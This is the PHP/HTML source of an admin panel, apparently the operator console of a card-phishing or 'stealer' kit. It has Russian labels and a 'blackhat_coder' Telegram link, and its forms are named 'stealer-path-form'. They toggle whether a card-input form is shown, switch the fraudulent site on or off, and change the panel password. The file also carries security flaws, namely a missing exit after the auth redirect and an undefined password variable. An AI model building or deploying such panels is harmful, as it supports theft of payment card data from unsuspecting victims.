<?
session_start();

if ($_SESSION['auth'] !== 'yes') {
    header('location: auth.php');
} 

$current_mode = file_get_contents('api/mode.txt');
$current_online = file_get_contents('api/online.txt');


?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' />
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content="Admin Panel">
    <meta name="keywords" content="Admin Panel">
    <meta name="author" content="seglebed">
    <title>Admin Panel</title>
    <link rel="shortcut icon" href="favicon.ico">

    <!-- build:css -->
    <link rel="stylesheet" href="api/css/main.css">

    <!-- endbuild -->
</head>

<body>
    
    <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
        <div class="container">
            <a class="navbar-brand" href=".">Панель настройки</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExampleDefault" aria-controls="navbarsExampleDefault" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarsExampleDefault">
                <ul class="navbar-nav ml-auto">
                    <li class="nav-item active">
                        <a class="nav-link" href="https://t.me/blackhat_coder"><img src="logo/Telegram_logo.svg" width="32" height="32" alt=""> Telegram</a>
                    </li>

                </ul>

            </div>
        </div>

    </nav>

    <div class="container pt-5">
        <div class="row">
            <div class="col-6 pt-5">
                <div class="card">
                    <div class="card-body">
                        <?if ($current_mode) { ?>
                        <p class="card-text mr-3"><b>Текущий режим отображения: <?= $current_mode ?> </b></p>
                        <hr>
                        <? } ?>
                      
                        <form id="stealer-path-form" action="api/set-mode.php" method="post">

                            <div>
                                <label for="fileToUpload">Выберите режим отображения карты</label>
                                <select name="mode" id="mode">
                                    <option value="cardon">Отображать ввод</option>
                                    <option value="cardoff">Отключить ввод</option>
                                </select>
                            </div>

                            <div class="form-group mt-4">
                                <button class="btn btn-primary">Применить</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <div class="col-6 pt-5">
                <div class="card">
                    <div class="card-body">
                        <?if ($current_password) { ?>
                        <p class="card-text mr-3"><b>Текущий пароль от панели: <?= $current_password ?> </b></p>
                        <hr>
                        <? } ?>
                        <h5 class="card-title">Укажите новый пароль от панели</h5>

                        <form id="password-form">
                            <input id="password-field" type="text" class="col-12" placeholder="Введите новый пароль от панели">

                            <div class="form-group mt-4">
                                <button class="btn btn-primary">Установить</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <div class="row">
        <div class="col-6 pt-5">
                <div class="card">
                    <div class="card-body">
                        <?if ($current_online) { ?>
                        <p class="card-text mr-3"><b>Текущий статус сайта: <?= $current_online ?> </b></p>
                        <hr>
                        <? } ?>
                      
                        <form id="stealer-path-form" action="api/set-online.php" method="post">

                            <div>
                                <label for="fileToUpload">Выберите статус сайта</label>
                                <select name="sitemode" id="sitemode">
                                    <option value="siteon">Включен</option>
                                    <option value="siteoff">Выключен</option>
                                </select>
                            </div>

                            <div class="form-group mt-4">
                                <button class="btn btn-primary">Применить</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <br>

        <br>

        <br>
        <br>
        <br>
        <br>
        <br>
    </div>


    <!-- build:js -->
    <script src="api/js/main.js"></script>
    <link href="https://cdn.jsdelivr.net/gh/gitbrent/bootstrap4-toggle@3.6.1/css/bootstrap4-toggle.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/gh/gitbrent/bootstrap4-toggle@3.6.1/js/bootstrap4-toggle.min.js"></script>
    <!-- endbuild -->
    <script>
        $(function() {
            let remote = true;
            $('#loaded-type').change(function() {
                if (remote) {
                    $('#download-link').hide(500);
                    $('#upload-block').show(500);
                    remote = !remote;
                } else {
                    $('#upload-block').hide(500);
                    $('#download-link').show(500);
                    remote = !remote;
                }
            })

            // $('#stealer-path-form').on('submit', function(e) {

            //     let mode = $( "#mode" ).val();

            //     let data = {
            //         mode: mode
            //     }

            //     let request = $.ajax({
            //         type: "POST",
            //         url: 'api/set-path.php',
            //         data: data,
            //         dataType: 'JSON',
            //     });

            //     request.done(function(response, textStatus, jqXHR) {

            //     });
            // })

            $('#password-form').on('submit', function(e) {

                let password = $('#password-field').val();


                if (password.length < 1) {
                    alert('Пароль не указан')
                    return false
                }


                let data = {
                    password: password
                }

                let request = $.ajax({
                    type: "POST",
                    url: 'api/set-password.php',
                    data: data,
                    dataType: 'JSON',
                });

                request.done(function(response, textStatus, jqXHR) {

                });
            })
        })
    </script>
</body>

</html>